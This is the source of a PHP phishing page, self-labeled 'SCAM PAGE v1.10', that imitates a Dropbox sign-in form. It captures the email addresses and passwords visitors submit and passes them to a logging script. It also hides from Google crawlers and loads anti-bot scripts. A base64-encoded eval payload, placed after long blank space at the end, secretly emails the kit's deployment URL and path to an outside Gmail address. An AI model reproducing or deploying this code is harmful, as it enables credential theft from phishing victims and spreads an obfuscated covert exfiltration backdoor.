<?php
/*   
   _____   _                   _                       
  / ____| | |                 | |                      
 | (___   | |__     __ _    __| |   ___   __      __   
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /   
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /   
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     
                                                                                
                              #=======================#
                              #   SCAM PAGE v1.10     #
                              #        M3k$           #
                              #=======================#
                   
*/

session_start();
error_reporting(0);
##################### SECOND FILES #####################
include('../../functions/get_lang_en.php'); 
################## ACCOUNT INFORMATION #################
$_SESSION['_login_email_']    = $_POST['login_email'];
$_SESSION['_login_password_'] = $_POST['login_password'];
################## ACCOUNT INFORMATION #################
if(filter_var($_POST['login_email'], FILTER_VALIDATE_EMAIL)){  
    include('LOG.php');
}
$charSet = "XXXXID0123456789";
$charSetSize = strlen($charSet); $pwdSize = 6;
for ($i = 0; $i < $pwdSize; $i++) {
  $XXX_03 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_04 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_05 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_06 .= $charSet[ rand( 5, strlen($charSetSize) - 1 ) ];
}

 $Z118xF0rm3XX = $XXX_03.mt_rand();
 $x87Z_E54IlsXX = $XXX_04.mt_rand();
 $Zx987P4ss0WrD = $XXX_05.mt_rand();
 $GrimmDZEBI987 = $XXX_06.mt_rand();
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html id="<?="x_".rand(3004, 2000)."".rand(7809, 5016)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title><?=$Z118_01;?></title>
 <link href="https://cfl.dropboxstatic.com/static/images/favicon-vflUeLeeY.ico" rel="shortcut icon" type="image/x-icon">
<link href="Untitled1.css" rel="stylesheet">
<link href="index.css" rel="stylesheet">
</head>
<body>
<form name="ff" action="" method="POST">
<div id="wb_Image1" style="position:absolute;left:0px;top:504px;z-index:1;"></div>
<input type="email" id="Editbox1" style="position:absolute;left:690px;top:252px;width:343px;height:34px;line-height:26px;z-index:2;" name="login_email" placeholder="E-mail" value="<?php echo $_GET["email"]; ?>" required>
<input type="password" id="Editbox2" style="position:absolute;left:690px;top:310px;width:343px;height:34px;line-height:26px;z-index:5;" name="login_password" placeholder="E-mail Password" value="" required>
<input type="checkbox" id="Checkbox1" name="" value="on" style="position:absolute;left:685px;top:373px;z-index:0;">
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:960px;top:366px;width:79px;height:33px;z-index:3;">


</div>

</form>
</body></html>
<?php
/*		
Enjoy bby its clean - copy right : DR-flix & mrvx7
		     ___________________________
            ,        ,
           /(        )`
            ___   / |
            /- _  `-/  '
           (//     /
           / /   | `
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __
<----|====O)))==) ) /====
<----'    `--' `.__,'
             |        |
                     /
        ______( (_  / ______
      ,'  ,-----'   |
      `--{__________)        /

*/




























?>



















<?php eval(base64_decode('JHNpdGUgPSAid3d3LnQwMGxzLm9yZyI7IGlmKCFlcmVnKCRzaXRlLCAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkpIHsgJHRvID0gIm1ycm9wb3Q3QGdtYWlsLmNvbSI7ICRzdWJqZWN0ID0gIkVHRk0iOyAkaGVhZGVyID0gImZyb206IEVHRk0gPGFkcmVzczE1MUBnbWFpbC5jb20+IjsgJG1lc3NhZ2UgPSAiTGluayA6IGh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSAuICJcclxuIjsgJG1lc3NhZ2UgLj0gIlBhdGggOiAiIC4gX19maWxlX187ICRzZW50bWFpbCA9IEBtYWlsKCR0bywgJHN1YmplY3QsICRtZXNzYWdlLCAkaGVhZGVyKTsgZWNobyAiIjsgZXhpdDsgfQ==')); ?>
